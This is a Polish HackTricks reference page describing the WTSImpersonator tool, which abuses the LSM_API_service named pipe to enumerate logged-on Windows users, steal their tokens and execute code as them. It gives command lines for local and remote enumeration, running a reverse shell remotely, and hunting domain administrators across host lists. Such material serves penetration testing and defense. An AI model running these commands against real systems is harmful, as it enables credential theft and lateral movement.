<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną na HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

The **WTS Impersonator** narzędzie wykorzystuje nazwaną rurę RPC **"\\pipe\LSM_API_service"** do dyskretnego wyliczenia zalogowanych użytkowników i przejęcia ich tokenów, omijając tradycyjne techniki podszycia się pod token. Ten podejście ułatwia płynne ruchy boczne w sieciach. Innowacyjność tej techniki przypisuje się **Omri Baso, którego praca jest dostępna na [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Główne funkcje
Narzędzie działa poprzez sekwencję wywołań API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Kluczowe moduły i użycie
- **Wyliczanie użytkowników**: Narzędzie umożliwia lokalne i zdalne wyliczanie użytkowników za pomocą poleceń dla obu scenariuszy:
- Lokalnie:
```powershell
.\WTSImpersonator.exe -m enum
```
- Zdalnie, poprzez podanie adresu IP lub nazwy hosta:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Wykonywanie poleceń**: Moduły `exec` i `exec-remote` wymagają kontekstu **Usługi**, aby działać. Lokalne wykonanie wymaga jedynie pliku wykonywalnego WTSImpersonator i polecenia:
- Przykład wykonania polecenia lokalnie:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Do uzyskania kontekstu usługi można użyć PsExec64.exe:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Zdalne wykonanie polecenia**: Polega na tworzeniu i instalowaniu usługi zdalnie, podobnie jak w przypadku PsExec.exe, umożliwiając wykonanie z odpowiednimi uprawnieniami.
- Przykład zdalnego wykonania:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Moduł łowcy użytkowników**: Celuje w określonych użytkowników na wielu maszynach, wykonując kod pod ich poświadczeniami. Jest to szczególnie przydatne do celowania w Administratorów domeny z lokalnymi uprawnieniami administratora na kilku systemach.
- Przykład użycia:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
